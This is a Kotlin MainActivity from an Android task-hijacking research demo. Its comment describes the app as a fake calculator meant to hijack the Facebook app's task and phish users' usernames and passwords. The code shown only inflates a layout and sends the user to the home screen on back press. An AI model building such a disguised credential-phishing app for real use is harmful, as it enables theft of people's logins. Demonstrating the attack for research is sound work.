package com.minhhnn.forsaken.androidtaskhijackingdemo

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.minhhnn.forsaken.androidtaskhijackingdemo.databinding.ActivityMainBinding

/**
 * A malicious app disguised at a simple calculator. This app can hijack facebook app task and trick user to give their username and password
 * This app just be used for research purpose, calculation function is not implement.
 * Thanks @baruckis (https://github.com/baruckis/Android-Calculator) for the layout
 */
class MainActivity : AppCompatActivity() {

    private lateinit var binding : ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    override fun onBackPressed() {
        super.onBackPressed()
        goToHomeLauncher()
    }

    fun goToHomeLauncher(){
        val startMain = Intent(Intent.ACTION_MAIN)
        startMain.addCategory(Intent.CATEGORY_HOME)
        startMain.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(startMain)
    }
}